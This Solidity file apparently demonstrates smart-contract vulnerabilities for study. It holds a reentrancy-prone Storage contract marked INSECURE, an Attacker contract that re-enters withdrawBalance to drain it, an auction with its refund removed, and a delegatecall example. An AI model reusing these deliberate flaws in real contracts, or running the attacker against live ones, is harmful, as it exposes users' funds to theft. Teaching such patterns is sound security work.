// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

contract Storage {
    // INSECURE
    mapping (address => uint) public userBalances;

    function lock() external payable {
        userBalances[msg.sender] += msg.value;
    }

    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        (bool success, ) = msg.sender.call{value: amountToWithdraw}(""); 
        require(success, "error");
        // At this point, the caller's code is executed, and can call withdrawBalance again

        userBalances[msg.sender] = 0;
    }
}

contract Attacker {
    Storage public target;
    uint256 lockedAmount;

    constructor(address _target) {
        target = Storage(_target);
    }

    function lock() external payable {
        lockedAmount += msg.value;
        target.lock{value: msg.value};
    }

    function withdrawBalance() external {
        target.withdrawBalance();
    }

    receive() external payable {
        if (address(target).balance >= lockedAmount) {
            target.withdrawBalance();
        }
    }
}

// INSECURE
contract Auction {
    address currentLeader;
    uint highestBid;

    function bid() external payable {
        require(msg.value > highestBid);
        //require(currentLeader.send(highestBid));
        // Refund the old leader, if it fails then revert
        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}

contract VendingMachine {
    address owner;
    error Unauthorized();
    function buy(uint amount) public payable {
        if (amount > msg.value / 2 ether)
        revert("Not enough Ether provided.");
        // Perform the purchase.
    }
    function withdraw() public {
        if (msg.sender != owner)
        revert Unauthorized();
        payable(msg.sender).transfer(address(this).balance);
    }
}

// Delegate
contract Delegator {
    function setNum(address _contract, uint _num) public {
        (bool success, bytes memory result) = _contract.delegatecall(abi.encodeWithSignature("setNum(uint256)", _num));
        require(success, "Delegate call failed");
    }
}

contract Implementation {
    uint256 a;

    function setNum(uint256 value) public {
        a = value;
    }
}